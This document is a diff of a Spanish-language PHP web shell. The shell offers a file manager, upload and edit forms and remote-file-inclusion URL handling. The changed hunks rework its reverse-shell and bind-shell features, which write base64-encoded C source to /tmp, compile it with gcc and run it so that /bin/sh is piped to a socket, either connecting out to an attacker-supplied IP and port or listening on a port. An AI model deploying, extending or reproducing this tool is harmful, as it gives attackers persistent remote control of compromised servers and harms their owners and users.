@@ -84,7 +84,7 @@ $clave_usuario = 'a0f1ba7debe4a2049b0f84d7dd95009a812f0b1a'; //"EMeLCo"
 $rfiurl = false;
 
 error_reporting(0); //final
-//error_reporting(E_ALL); //desarrollo
+error_reporting(E_ALL); //desarrollo
 
 /**/ 
 
@@ -347,8 +347,8 @@ echo'
                 document.cookie = "lateral=ON; path=/";
             }
             </script>
-            <img src="?w=img&imagen=derecha" alt="&gt; &gt;" id="flechaderecha" onclick="ocultar();">
-            <img src="?w=img&imagen=izquierda" style="display:none;" id="flechaizquierda" alt="&lt; &lt;" onclick="mostrar();">
+            <img src="'.$rfiurl.'w=img&imagen=derecha" alt="&gt; &gt;" id="flechaderecha" onclick="ocultar();">
+            <img src="'.$rfiurl.'w=img&imagen=izquierda" style="display:none;" id="flechaizquierda" alt="&lt; &lt;" onclick="mostrar();">
         </div>
         
         <div style="float:right; width: 90%; margin: auto 0 auto 0; overflow:auto;">'.mostrarinformacion().'
@@ -867,13 +867,13 @@ psybnc.conf
             unset($archivos[0]);
             
             //las tres primeras filas
-            echo '<tr><td class="ac"><img src="?w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=subir" method="post" enctype="multipart/form-data">
+            echo '<tr><td class="ac"><img src="'.$rfiurl.'w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=subir" method="post" enctype="multipart/form-data">
             <td style="text-align:left;font-size:0px;" colspan="4"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/">
             <input name="ruta2" type="file" style="width:100%;"></td> <td><input type="submit" value="Crear archivo" style="width:100%"></td></form></tr>
-            <tr><td class="ac"><img src="?w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=editar" method="POST">
+            <tr><td class="ac"><img src="'.$rfiurl.'w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=editar" method="POST">
             <td style="text-align:left;font-size:0px;" colspan="4"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/"><input name="ruta2" style="width:100%;" value="archivo.txt"></td>
             <td><input type="submit" value="Crear archivo" style="width:100%"></td></form></tr>
-            <tr><td class="ac"><img src="?w=img&imagen=carpetanueva" class="ai" alt="Carpeta nuevo"></td><form action="'.$rfiurl.'w=nuevacarpeta" method="POST">
+            <tr><td class="ac"><img src="'.$rfiurl.'w=img&imagen=carpetanueva" class="ai" alt="Carpeta nuevo"></td><form action="'.$rfiurl.'w=nuevacarpeta" method="POST">
             <td style="text-align:left;font-size:0px;" colspan="4"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/"><input name="ruta2" style="width:100%;" value="carpeta"></td>
             <td><input type="submit" value="Crear carpeta" style="width:100%"></td></form></tr>';
             
@@ -1303,11 +1303,11 @@ psybnc.conf
             }elseif($_POST["metodoinversa"] == "c"){
 		escribirarchivo("/tmp/bc.c", base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQoJcHJpbnRmKCJFcnJvciIsc3Rkb3V0KTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIGR1cDIoZmQsIDApOw0KICAgIGR1cDIoZmQsIDEpOw0KICAgIGR1cDIoZmQsIDIpOw0KICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgIGNsb3NlKGZkKTsNCn0="));
 		chmod("/tmp/bc.c",0777);
-                echo '<div class="n">'.exec("gcc -o /tmp/bc /tmp/bc.c").'</div>';
+                echo '<div class="n">'.shell("gcc -o /tmp/bc /tmp/bc.c 2>&1",false).'</div>';
                 unlink("/tmp/bc.c");
 		chmod("/tmp/bc",0777);
                 $resultado = shell('/tmp/bc '.$_POST["ip"]." ".$_POST["puertoinversa"], false);
-                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(leerarchivo("/tmp/bc")==false)){
+                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(file_exists("/tmp/bc")==false)){
                     echo '<div class="n">No se pudo conectar</div>';
                 }else{
                     echo '<div class="s">Conectado</div>'; 
@@ -1326,11 +1326,11 @@ psybnc.conf
                 }
             }elseif($_POST["metodoescuchar"] == "c"){
                 escribirarchivo("/tmp/bp.c", base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGludCBzb2NrZmQsIG5ld2ZkLCBpOwogICAgY2hhciBwYXNzWzMwXTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7CiAgICBkYWVtb24oMSwwKTsKICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOwogICAgaWYoIXNvY2tmZCl7CglwcmludGYoIkVycm9yIixzdGRvdXQpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgcmVtb3RlLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzFdKSk7CiAgICByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgICBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOwogICAgbGlzdGVuKHNvY2tmZCwgNSk7CiAgICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7CiAgICBkdXAyKG5ld2ZkLDApOwogICAgZHVwMihuZXdmZCwxKTsKICAgIGR1cDIobmV3ZmQsMik7CiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsKICAgIGNsb3NlKG5ld2ZkKTsKfQ=="));		chmod("/tmp/bc.c",0777);
-                echo '<div class="n">'.exec("gcc -o /tmp/bp /tmp/bp.c").'</div>';
+                echo '<div class="n">'.shell("gcc -o /tmp/bp /tmp/bp.c 2>&1",false).'</div>';
                 unlink("/tmp/bp.c");
 		chmod("/tmp/bp",0777);
                 $resultado = shell('/tmp/bp '.$_POST["puertoescuchar"], false);
-                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(leerarchivo("/tmp/bp")==false)){
+                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(file_exists("/tmp/bp")==false)){
                     echo '<div class="n">No se pudo conectar</div>';
                 }else{
                     echo '<div class="s">Conectado</div>'; 
